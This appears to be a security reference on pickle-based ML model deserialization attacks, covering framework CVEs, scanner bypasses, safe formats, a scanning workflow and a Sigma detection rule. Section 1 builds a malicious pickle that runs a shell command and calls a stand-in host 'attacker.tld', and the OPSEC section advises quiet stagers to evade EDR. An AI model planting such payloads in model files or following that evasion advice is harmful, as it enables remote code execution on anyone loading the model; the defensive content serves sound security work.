# ML Supply Chain — Model Deserialization RCE

OWASP LLM03:2025 (Supply Chain). MITRE ATLAS `AML.T0010` (ML Supply Chain Compromise),
`AML.T0011` (Develop/obtain malicious model). CWE-502 (Deserialization of Untrusted Data),
CWE-646 (Reliance on File Name/Extension — the scanner-bypass class).

## 1. Why a model file is code

Python `pickle` (and therefore `torch.save`/`torch.load`, `numpy.load(allow_pickle=True)`,
`joblib`, Keras Lambda layers) executes a tiny VM during deserialization. The `REDUCE`
opcode calls a callable from a `GLOBAL` with attacker-chosen args → arbitrary code on
`load`. A "model" `.pt/.pkl/.bin/.ckpt` is a code-execution primitive.

```python
# Build a malicious model artifact (authorized lab only) — payload runs on torch.load/pickle.load
import pickle, torch, os
class Exploit:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned; curl -s http://attacker.tld/$(hostname)",))
with open("model.pkl","wb") as f:        # or wrap in a torch .pt zip / legacy .tar
    pickle.dump(Exploit(), f)
```

~45% of high-download HuggingFace repos still ship pickle models (incl. Meta/Google/
MS/NVIDIA), 21% pickle-only — so "just use safetensors" isn't reality yet.

## 2. Framework / inference-server CVEs (2024-2025)

| CVE | Component | Detail | Fixed |
|-----|-----------|--------|-------|
| CVE-2025-32434 | PyTorch ≤2.5.1 | `torch.load(weights_only=True)` — the *trusted safety flag* — still reaches RCE via a crafted legacy `.tar`. CVSS 4.0 9.3, CWE-502. | 2.6.0 |
| CVE-2024-50050 | Meta Llama Stack | Python inference API auto-`pickle.loads()` objects off a ZeroMQ socket. CVSS 9.3. | patched |
| CVE-2025-32444 | vLLM 0.6.5–0.8.5 (Mooncake) | `recv_pyobj()` → implicit `pickle.loads()` over ZeroMQ bound on all interfaces → unauth network RCE. **CVSS 10.0**. | 0.8.5 |
| CVE-2025-23254 | NVIDIA TensorRT-LLM | pickle over IPC → RCE. | patched |

Takeaway: `weights_only=True` is **no longer a guarantee** on PyTorch <2.6.0; network-
facing inference servers that pickle over sockets are pre-auth RCE.

## 3. Scanner-bypass family — picklescan (early 2025)

The defensive scanners themselves were bypassable. picklescan uses a *blocklist* of unsafe
globals — fundamentally fragile:

| CVE | Bypass |
|-----|--------|
| CVE-2025-1716 | `pip.main()` not on the blocklist → install/run arbitrary package; evades scan. |
| CVE-2025-1889 | Only scans standard extensions → ship the pickle with a non-standard ext (CWE-646). |
| CVE-2025-1944 | ZIP central-directory vs local filename mismatch → PyTorch loads it, picklescan skips it. |
| CVE-2025-1945 | Modified ZIP flag bits → `zipfile` errors out (scan skipped) but `torch.load` ignores them and loads. |

Fixed in picklescan ≥0.0.22 (added `pip` + more globals). JFrog disclosed **3 more
zero-days** (reported Jun 2025, fixed in **0.0.31**, Sep 2025). Lesson: blocklist scanners
will keep losing — prefer **allowlist** (fickling) and **format** defenses.

## 4. Defensive formats

- **safetensors** (HF, Sept 2022; Trail-of-Bits audited): tensor-only container,
  structurally cannot carry code. Convert: `safetensors` / `transformers` auto-save.
- **GGUF** (Aug 2023): llama.cpp ecosystem, safe-by-design metadata+tensors.
- Principle: a format's safety = the expressivity of its load operations. Tensor-only
  formats can't execute.

## 5. Scanning workflow (scan BEFORE you load — never "load to test")

```bash
# (this skill) static scan: pickle opcode disasm + dangerous-GLOBAL allowlist, keras Lambda,
# zip-smuggling (CVE-2025-1944/1945 style mismatch), non-standard ext (CVE-2025-1889)
python3 scripts/model_scan.py ./downloaded_model/ --deep --json out/modelscan.jsonl

# cross-check with maintained tools:
pip install 'picklescan>=0.0.31' modelscan fickling
picklescan -p ./downloaded_model/model.bin          # blocklist (keep current!)
modelscan -p ./downloaded_model/                    # Protect AI: torch/TF/keras
fickling --check-safety ./downloaded_model/model.pkl   # Trail of Bits: allowlist, opcode trace

# safest: refuse pickle entirely
python3 -c "from safetensors.torch import load_file; load_file('model.safetensors')"
```

## Detection

- **Pre-load static scan** (above) gated in CI/registry; quarantine on any dangerous
  `GLOBAL`/`REDUCE` to `os/posix/subprocess/runpy/builtins.eval|exec/pip`.
- **EDR runtime**: a python process spawning `sh/cmd/curl/powershell` *during* model load,
  or unexpected outbound from an inference host, is the live-exploit IOC.
- **Network** (vLLM/Llama-Stack class): inference daemons must not expose ZeroMQ/pickle
  sockets to untrusted networks — alert on `0.0.0.0` binds + pin patched versions.

Sigma:

```yaml
title: Malicious ML Model Deserialization / Load-time RCE
logsource: { category: process_creation }
detection:
  load_then_shell:
    ParentImage|endswith: '\python.exe'
    ParentCommandLine|contains|nocase: ['torch.load','pickle.load','joblib.load','load_model','from_pretrained']
    Image|endswith: ['\cmd.exe','\powershell.exe','\sh','\bash','\curl.exe','\pip.exe']
  condition: load_then_shell
level: critical
```

IOCs: `c__builtin__\neval` / `posix\nsystem` / `pip\nmain` in pickle bytecode; `.pkl/.bin`
with mismatched ZIP central directory; non-standard model extensions; inference host
binding pickle sockets on `0.0.0.0`; python→shell process tree at load time.

## OPSEC

- *Scanning* is local and safe. *Loading* an untrusted pickle is the dangerous act — never
  "just load it to see"; scan and disassemble opcodes first.
- A malicious model is a durable, attributable artifact (hash, upload account). For a
  delivered payload prefer minimal footprint and clean exit; loud `os.system` shells trip
  EDR — use in-memory/quiet stagers if stealth matters (see edr-evasion / shellcode-dev).
- Defender-side, run scanners in an isolated, network-egress-blocked sandbox; treat the
  scanner itself as attack surface (picklescan CVEs) and keep it ≥0.0.31.

## References

- PyTorch advisory GHSA-53q9-r3pm-6pq6 / CVE-2025-32434; NVD CVE-2024-50050; vLLM GHSA-hj4w-hm2g-p6w5 / CVE-2025-32444.
- Sonatype, "Bypassing picklescan" (CVE-2025-1716/1889/1944/1945); JFrog, "3 Zero-Day picklescan Vulnerabilities," Dec 2025.
- "Models Are Codes: Measuring Malicious Code Poisoning on Pre-trained Model Hubs," arXiv:2409.09368.
- "PickleBall: Secure Deserialization of Pickle-based ML Models," arXiv:2508.15987 (2025).
- Trail of Bits fickling; Protect AI modelscan; HuggingFace safetensors / llama.cpp GGUF.
- OWASP LLM03:2025; MITRE ATLAS AML.T0010/AML.T0011.
